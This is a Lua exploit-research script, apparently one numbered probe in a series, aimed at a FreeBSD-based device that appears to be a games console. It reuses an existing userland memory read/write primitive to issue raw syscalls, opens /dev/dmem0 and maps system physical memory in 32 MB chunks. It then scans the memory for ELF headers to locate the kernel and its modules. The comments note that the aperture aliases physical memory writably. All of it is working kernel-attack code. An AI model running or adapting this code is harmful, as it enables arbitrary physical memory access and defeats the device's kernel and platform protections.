-- CRASH_CLASS: HIGH
-- PROBE 807a: locate the kernel image in physical memory through the dmem0 aperture
--
-- 806b-806d: mmap(/dev/dmem0, phys) validates only 0x4000 alignment, two mappings of the same
-- phys alias, and a write at phys 0x100000 persists -- so the aperture is system physical
-- memory, not a GPU carveout.  The fine scan already showed x86 page tables at 0x10014000 and
-- 0xAFAF guard patterns in the low 512 MB.  This probe maps physical memory in 32 MB chunks and
-- records every 4 KiB page that begins with an ELF header (the kernel and its modules).
print("=== PROBE 807a: PHYSICAL KERNEL LOCATION ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_open = make_syscall(5)
pcall(function() return getpid() end)
local s = "/dev/dmem0"
local cpath = memory.alloc(32)
for i = 1, #s do pcall(function() memory.write_byte(cpath + i - 1, s:byte(i)) end) end
pcall(function() memory.write_byte(cpath + #s, 0) end)
local fd = to_num(select(2, pcall(function() return sc_open(uint64(cpath), uint64(2), uint64(0)) end)))
print("[0] fd=" .. fd)
local VA = 0x880000000
local CHUNK = 0x2000000
local function map_chunk(phys, len)
    pcall(function() return sc_munmap(uint64(VA), uint64(len)) end)
    local ok, r = pcall(function()
        return sc_mmap(uint64(VA), uint64(len), uint64(0x33), uint64(0x11),
            uint64(fd), u64(math.floor(phys / 4294967296), phys % 4294967296))
    end)
    if not ok then return false end
    return to_num(r) == VA
end
local function unmap(len) pcall(function() return sc_munmap(uint64(VA), uint64(len)) end) end

local hits = {}
local LIMIT = 0x60000000
local total_nz = 0
local p = 0
while p < LIMIT do
    if map_chunk(p, CHUNK) then
        local off = 0
        local nz = 0
        while off < CHUNK do
            local v = rd(VA + off)
            if v ~= nil and v ~= 0 then
                nz = nz + 1
                if v == 0x464C457F and #hits < 40 then
                    local etype = rd(VA + off + 0x10)
                    local machine = rd(VA + off + 0x14)
                    local entry = rd(VA + off + 0x18)
                    hits[#hits + 1] = string.format("%X type=%d mach=%d entry=%X",
                        p + off, etype or 0, machine or 0, entry or 0)
                end
            end
            off = off + 0x1000
        end
        total_nz = total_nz + nz
        print(string.format("  chunk %08X mapped nz=%d", p, nz))
        unmap(CHUNK)
    else
        print(string.format("  chunk %08X map-failed", p))
    end
    p = p + CHUNK
end
print("")
print("[1] ELF headers found: " .. #hits)
for i = 1, #hits do print("   " .. hits[i]) end
print("")
print("[2] non-zero pages total=" .. total_nz)
print("[3] alive pid=" .. to_num(getpid()))
